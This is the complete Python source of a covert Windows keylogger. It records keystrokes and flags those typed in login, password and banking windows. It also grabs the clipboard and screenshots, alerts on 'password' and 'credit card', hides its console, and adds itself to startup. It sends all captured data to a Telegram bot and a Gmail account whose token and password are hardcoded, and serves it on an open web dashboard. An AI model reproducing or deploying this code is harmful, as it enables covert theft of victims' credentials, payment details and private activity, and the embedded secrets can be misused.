import ctypes
import json
import os
import smtplib
import socket
import sys
import threading
import time
import urllib.request
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

import pythoncom
import pyWinhook as pyHook
import win32api
import win32clipboard
import win32event
import win32gui
import winerror
from PIL import ImageGrab
from flask import Flask, jsonify, send_file

# ========== Configuration ==========
KEYWORDS = ["password", "credit card"]
PASSWORD_WINDOW_TITLES = ["password", "login", "sign in", "log in", "credential", "bank"]
EMAIL = "nafiaku447@gmail.com"
PASSWORD = "gwqwccuzmfwemsxb"
INTERVAL = 60            # seconds between email reports
MAX_LOG_LINES = 300      # auto-send when keylog exceeds this
WEB_PORT = 5000          # dashboard port
MAX_LOG_SIZE = 1_000_000  # 1 MB — rotate cache
LOG_KEEP = 500_000       # bytes to keep after rotation
TIMESTAMP_GAP = 30       # seconds between timestamp markers in keylog
CACHE_XOR_KEY = 87       # simple XOR key for cache obfuscation

# ========== Telegram Config ==========
TELEGRAM_TOKEN = "8947856719:AAE7YKFIcasA5ptYIE1X5BZNxKYS9eORE90"
TELEGRAM_CHAT_ID = "8068054546"   # dari @userinfobot

# ========== Global State ==========
lock = threading.Lock()
keylogs = []
clipboard_data = []
screenshots = []
window_log = []
force_send = False
last_timestamp = 0.0
system_info = ""
system_info_sent = False
keyword_hits = []  # list of (timestamp, snippet) tuples
_mutex = None  # kept alive to hold the Windows mutex

SCREENSHOT_DIR = os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), "screenshots")
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), ".keylog_cache")

# ========== Key Filtering ==========
MODIFIERS = {
    'Lshift', 'Rshift', 'Lcontrol', 'Rcontrol',
    'Lmenu', 'Rmenu', 'Lwin', 'Rwin', 'Capital',
    'Numlock', 'Scroll', 'Oem_clear',
}

SPECIALS = {
    'Return': '[ENTER]\n',
    'Space': ' ',
    'Back': '[⌫]',
    'Delete': '[⌦]',
    'Tab': '\t',
    'Escape': '[ESC]',
    'Left': '[←]', 'Right': '[→]',
    'Up': '[↑]', 'Down': '[↓]',
    'Prior': '[PgUp]', 'Next': '[PgDn]',
    'Home': '[Home]', 'End': '[End]',
    'Insert': '[Ins]',
}

F_KEYS = {f'F{i}' for i in range(1, 13)}

# ========== Helpers ==========
def get_active_window():
    try:
        hwnd = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(hwnd)
    except:
        return "Unknown"

def is_password_window(title):
    title_lower = title.lower()
    for kw in PASSWORD_WINDOW_TITLES:
        if kw in title_lower:
            return True
    return False

def xor_bytes(data, key=CACHE_XOR_KEY):
    return bytes(b ^ key for b in data)

def get_system_info():
    try:
        hostname = socket.gethostname()
        username = os.getlogin()
        ip = socket.gethostbyname(hostname)
        return f"Host: {hostname}  |  User: {username}  |  IP: {ip}  |  OS: {sys.getwindowsversion().major}.{sys.getwindowsversion().minor}"
    except:
        return "System info unavailable"

def rotate_log_if_needed():
    try:
        if not os.path.exists(LOG_FILE):
            return
        if os.path.getsize(LOG_FILE) > MAX_LOG_SIZE:
            with open(LOG_FILE, 'rb') as f:
                f.seek(os.path.getsize(LOG_FILE) - LOG_KEEP)
                tail = f.read()
            with open(LOG_FILE, 'wb') as f:
                f.write(tail)
    except:
        pass

def hide_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
    except:
        pass

# ========== Keylogger Core ==========
def on_keyboard_event(event):
    global keylogs, window_log, force_send, last_timestamp

    if event.Key in MODIFIERS:
        return True

    now = time.time()

    with lock:
        current = get_active_window()
        last_window = window_log[-1] if window_log else ''
        window_changed = current and current != last_window

        if window_changed:
            window_log.append(current)
            keylogs.append(f'\n═══ {current} ═══\n')
            last_timestamp = now
            pwd = is_password_window(current)
            if pwd:
                keylogs.append('[🔑 password field]\n')

        # Periodic timestamp marker
        if now - last_timestamp > TIMESTAMP_GAP:
            keylogs.append(f'\n[{time.strftime("%H:%M:%S")}]\n')
            last_timestamp = now

        if event.Key in SPECIALS:
            keylogs.append(SPECIALS[event.Key])
        elif event.Key in F_KEYS:
            keylogs.append(f'[{event.Key}]')
        elif event.Ascii and 32 <= event.Ascii <= 126:
            if is_password_window(current):
                keylogs.append(f'🔑{chr(event.Ascii)}')
            else:
                keylogs.append(chr(event.Ascii))

        if len(keylogs) > MAX_LOG_LINES:
            force_send = True

    return True

def on_clipboard_change():
    global clipboard_data
    win32clipboard.OpenClipboard()
    try:
        try:
            data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
            text = data.decode('latin-1').strip()
        except:
            return
        if text:
            with lock:
                if not clipboard_data or text != clipboard_data[-1]:
                    clipboard_data.append(text)
    finally:
        try:
            win32clipboard.CloseClipboard()
        except:
            pass

def capture_screenshot():
    global screenshots
    try:
        filename = f"ss_{int(time.time())}.png"
        filepath = os.path.join(SCREENSHOT_DIR, filename)
        screenshot = ImageGrab.grab()
        screenshot.save(filepath)
        with lock:
            screenshots.append(filename)
    except Exception:
        pass

def check_keywords(text):
    for keyword in KEYWORDS:
        if keyword.lower() in text.lower():
            return True
    return False


# ========== Telegram Reporter ==========
def telegram_send_text(text, parse_mode="HTML"):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = json.dumps({
            "chat_id": TELEGRAM_CHAT_ID,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": True,
        }).encode("utf-8")
        req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=15)
        return True
    except Exception as e:
        print(f"[!] Telegram text failed: {e}")
        return False

def telegram_send_photo(filepath, caption=""):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
        boundary = "----NafiBoundary"
        with open(filepath, "rb") as f:
            file_data = f.read()
        filename = os.path.basename(filepath)
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="chat_id"\r\n\r\n'
            f"{TELEGRAM_CHAT_ID}\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="caption"\r\n\r\n'
            f"{caption}\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="photo"; filename="{filename}"\r\n'
            f"Content-Type: image/png\r\n\r\n"
        ).encode("utf-8") + file_data + f"\r\n--{boundary}--\r\n".encode("utf-8")
        req = urllib.request.Request(url, data=body, headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
        })
        urllib.request.urlopen(req, timeout=30)
        return True
    except Exception as e:
        print(f"[!] Telegram photo failed: {e}")
        return False

def telegram_report(keys_snapshot, clip_snapshot, ss_snapshot):
    if not keys_snapshot and not clip_snapshot:
        return

    # Kirim keylog (maks 4000 karakter per pesan)
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    header = f"<b>Keylogger Report</b>\n<i>{timestamp}</i>\n\n"

    keylog_text = "<b>Keylogs:</b>\n<pre>" + ("".join(keys_snapshot).strip() or "(empty)") + "</pre>"

    clip_text = ""
    if clip_snapshot:
        clip_text = "\n<b>Clipboard:</b>\n" + "\n---\n".join(clip_snapshot[:5])  # max 5 clip entries

    full_text = header + keylog_text + clip_text

    # Potong kalau kepanjangan
    if len(full_text) > 4000:
        full_text = full_text[:3900] + "\n...\n<i>(dipotong)</i>"

    telegram_send_text(full_text)

    # Kirim screenshot
    for ss in ss_snapshot:
        path = os.path.join(SCREENSHOT_DIR, ss)
        if os.path.exists(path):
            telegram_send_photo(path, caption=f"Screenshot {ss}")


# ========== Email Reporter ==========
def send_report():
    global keylogs, clipboard_data, screenshots, system_info_sent

    with lock:
        if not keylogs and not clipboard_data and not screenshots:
            return
        keys_snapshot = list(keylogs)
        clip_snapshot = list(clipboard_data)
        ss_snapshot = list(screenshots)

    # Fallback cache (XOR-obfuscated)
    try:
        raw = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}]\n=== Keylogs ===\n"
        raw += "".join(keys_snapshot).strip() or "(empty)"
        raw += "\n=== Clipboard ===\n"
        raw += "\n---\n".join(clip_snapshot).strip() or "(empty)"
        raw += "\n"
        with open(LOG_FILE, 'ab') as f:
            f.write(xor_bytes(raw.encode('utf-8', errors='replace')))
        rotate_log_if_needed()
    except:
        pass

    # Telegram report (di thread terpisah supaya tidak menghambat)
    def _tg():
        global system_info
        with lock:
            tg_keys = list(keys_snapshot)
            tg_clip = list(clip_snapshot)
            tg_ss = list(ss_snapshot)
        if not system_info_sent:
            header = f"<b>System Info:</b>\n<code>{get_system_info()}</code>\n\n"
            telegram_send_text(header)
        telegram_report(tg_keys, tg_clip, tg_ss)
    threading.Thread(target=_tg, daemon=True).start()

    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL
        msg['To'] = EMAIL
        msg['Subject'] = f"Keylogger Report — {time.strftime('%Y-%m-%d %H:%M')}"

        body = ""
        if not system_info_sent:
            global system_info
        system_info = get_system_info()
        body += f"=== System Info ===\n{system_info}\n\n"
        system_info_sent = True
        body += f"=== Keylogs ({len(keys_snapshot)} lines) ===\n"
        body += "".join(keys_snapshot).strip() or "(empty)"
        body += f"\n\n=== Clipboard ({len(clip_snapshot)} entries) ===\n"
        body += "\n---\n".join(clip_snapshot).strip() or "(empty)"
        msg.attach(MIMEText(body, 'plain'))

        for ss in ss_snapshot:
            path = os.path.join(SCREENSHOT_DIR, ss)
            if os.path.exists(path):
                with open(path, "rb") as f:
                    msg.attach(MIMEImage(f.read(), name=ss))

        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(EMAIL, PASSWORD)
        server.sendmail(EMAIL, EMAIL, msg.as_string())
        server.quit()

        for ss in ss_snapshot:
            path = os.path.join(SCREENSHOT_DIR, ss)
            try:
                os.remove(path)
            except:
                pass

        print(f"[{time.strftime('%H:%M:%S')}] Report sent — {len(keys_snapshot)} keys, {len(clip_snapshot)} clip, {len(ss_snapshot)} ss.")

    except Exception as e:
        print(f"[!] Send failed: {e}")
        return

    with lock:
        del keylogs[:len(keys_snapshot)]
        del clipboard_data[:len(clip_snapshot)]
        screenshots[:] = [s for s in screenshots if s not in ss_snapshot]


# ========== Hook Thread ==========
def keyboard_hook_thread():
    while True:
        try:
            pythoncom.CoInitialize()
            hm = pyHook.HookManager()
            hm.KeyDown = on_keyboard_event
            hm.HookKeyboard()
            pythoncom.PumpMessages()
        except Exception as e:
            print(f"[!] Hook thread crashed: {e}, restarting in 5s...")
            time.sleep(5)


# ========== Web Dashboard ==========
app = Flask(__name__)

DASHBOARD_HTML = r"""
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Keylogger Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',sans-serif;padding:20px}
h1{color:#58a6ff;margin-bottom:10px;font-size:22px}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-top:20px}
.card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px}
.card h2{color:#f78166;font-size:15px;margin-bottom:10px;border-bottom:1px solid #30363d;padding-bottom:8px}
pre{background:#0d1117;padding:12px;border-radius:6px;font-size:12px;font-family:'Cascadia Code','Fira Code',monospace;white-space:pre-wrap;word-break:break-all;max-height:400px;overflow-y:auto;line-height:1.5}
.imgs{display:flex;flex-wrap:wrap;gap:8px}
.imgs img{max-width:250px;border-radius:4px;border:1px solid #30363d}
.badge{display:inline-block;background:#238636;color:white;padding:2px 10px;border-radius:12px;font-size:11px;margin-right:6px}
.badge.alert{background:#da3633;animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
.topbar{display:flex;align-items:center;gap:16px;flex-wrap:wrap}
.topbar span{color:#8b949e;font-size:12px}
.sysinfo{background:#1a1f2e;border:1px solid #30363d;border-radius:6px;padding:8px 14px;margin:12px 0 4px;font-size:11px;color:#8b949e;font-family:'Cascadia Code','Fira Code',monospace}
.sysinfo b{color:#58a6ff}
.pwd{color:#f0883e}
.keyword-card{border-color:#da3633}
.keyword-card h2{color:#f0883e}
.kw-hit{background:#1a1118;border:1px solid #3d2020;border-radius:4px;padding:8px 10px;margin-bottom:6px;font-size:11px}
.kw-hit .time{color:#da3633;font-weight:700}
.kw-hit pre{background:transparent;padding:4px 0 0;max-height:60px;font-size:11px;color:#c9d1d9}
</style>
</head>
<body>
<div class="topbar">
  <h1>⌨️ Keylogger Dashboard</h1>
  <span class="badge" id="status">live</span>
  <span class="badge" id="kw-badge" style="display:none">⚠ keyword</span>
  <span id="time"></span>
</div>
<div class="sysinfo" id="sysinfo">Loading...</div>
<div class="grid">
  <div class="card">
    <h2>📝 Keylogs</h2>
    <pre id="keylogs">Loading...</pre>
  </div>
  <div class="card keyword-card">
    <h2>⚠ Keyword Alerts</h2>
    <div id="keyword-hits">(none)</div>
  </div>
  <div class="card">
    <h2>📋 Clipboard</h2>
    <pre id="clipboard">Loading...</pre>
  </div>
  <div class="card">
    <h2>🪟 Active Windows</h2>
    <pre id="windows">Loading...</pre>
  </div>
  <div class="card" style="grid-column:1/-1">
    <h2>📸 Screenshots</h2>
    <div class="imgs" id="screenshots">Loading...</div>
  </div>
</div>
<script>
async function refresh(){
try{
const r=await fetch('/api/data');
const d=await r.json();
document.getElementById('keylogs').innerHTML=(d.keylogs||'(empty)').replace(/🔑./g,'<span class="pwd">$&</span>');
document.getElementById('clipboard').textContent=d.clipboard||'(empty)';
document.getElementById('windows').textContent=d.windows||'(empty)';
document.getElementById('screenshots').innerHTML=d.screenshots.map(s=>`<a href="/screenshot/${s}" target="_blank"><img src="/screenshot/${s}"></a>`).join('')||'(none)';
document.getElementById('sysinfo').innerHTML='<b>System:</b> '+(d.sysinfo||'(pending...)');
document.getElementById('time').textContent=new Date().toLocaleTimeString();
document.getElementById('status').style.background=d.alive?'#238636':'#da3633';
var kwBadge=document.getElementById('kw-badge');
var hits=d.keyword_hits||[];
if(hits.length){
kwBadge.style.display='inline-block';
kwBadge.textContent='⚠ '+hits.length+' keyword hit'+(hits.length>1?'s':'');
var html='';
for(var i=hits.length-1;i>=0;i--){
html+='<div class="kw-hit"><span class="time">'+hits[i].time+'</span><pre>'+hits[i].snippet+'</pre></div>';
}
document.getElementById('keyword-hits').innerHTML=html;
}else{
kwBadge.style.display='none';
document.getElementById('keyword-hits').innerHTML='(none)';
}
}catch(e){document.getElementById('status').style.background='#da3633'}
}
setInterval(refresh,5000);
refresh();
</script>
</body>
</html>
"""

@app.route('/')
def dashboard():
    return DASHBOARD_HTML

@app.route('/api/data')
def api_data():
    with lock:
        return jsonify({
            'keylogs': ''.join(keylogs).strip() or '(empty)',
            'clipboard': '\n---\n'.join(clipboard_data) or '(empty)',
            'windows': '\n'.join(window_log[-20:]) or '(empty)',
            'screenshots': list(screenshots),
            'sysinfo': system_info or '(pending first report)',
            'keyword_hits': [{'time': t, 'snippet': s} for t, s in keyword_hits],
            'alive': True,
        })

@app.route('/screenshot/<filename>')
def serve_screenshot(filename):
    path = os.path.join(SCREENSHOT_DIR, filename)
    if os.path.exists(path):
        return send_file(path, mimetype='image/png')
    return 'not found', 404

def start_web():
    print(f"[*] Dashboard → http://localhost:{WEB_PORT}")
    app.run(host='0.0.0.0', port=WEB_PORT, debug=False, use_reloader=False)


# ========== Persistence ==========
def create_persistence():
    import win32com.client

    target = os.path.abspath(sys.argv[0])
    startup_folder = os.path.expanduser("~") + r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    shortcut_path = os.path.join(startup_folder, "keylogger.lnk")

    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = target
    shortcut.WorkingDirectory = os.path.dirname(target)
    shortcut.WindowStyle = 7  # minimized
    shortcut.save()


# ========== Main Controller ==========
def main_loop():
    global force_send

    while True:
        for _ in range(INTERVAL):
            time.sleep(1)
            with lock:
                trigger = force_send or len(keylogs) > MAX_LOG_LINES
            if trigger:
                break

        capture_screenshot()
        on_clipboard_change()

        with lock:
            log_text = "".join(keylogs)
        if check_keywords(log_text):
            print("[!] Keyword detected!")
            with lock:
                snippet = log_text[-200:] if len(log_text) > 200 else log_text
                keyword_hits.append((time.strftime('%H:%M:%S'), snippet))
                if len(keyword_hits) > 50:
                    keyword_hits.pop(0)
            capture_screenshot()

        send_report()
        with lock:
            force_send = False


# ========== Entry Point ==========
if __name__ == '__main__':
    # Prevent double instance
    _mutex = win32event.CreateMutex(None, False, "Local\\NafiKeylogger")
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        print("[!] Another instance is already running. Exiting.")
        sys.exit(0)

    # Hide console window
    hide_console()

    # Persistence (shortcut only — no duplicate copy)
    try:
        create_persistence()
        print("[*] Added to startup.")
    except Exception:
        print("[!] Startup persistence failed (AV may have blocked it).")

    threading.Thread(target=keyboard_hook_thread, daemon=True).start()
    threading.Thread(target=start_web, daemon=True).start()

    print("[*] Keylogger running...")
    main_loop()
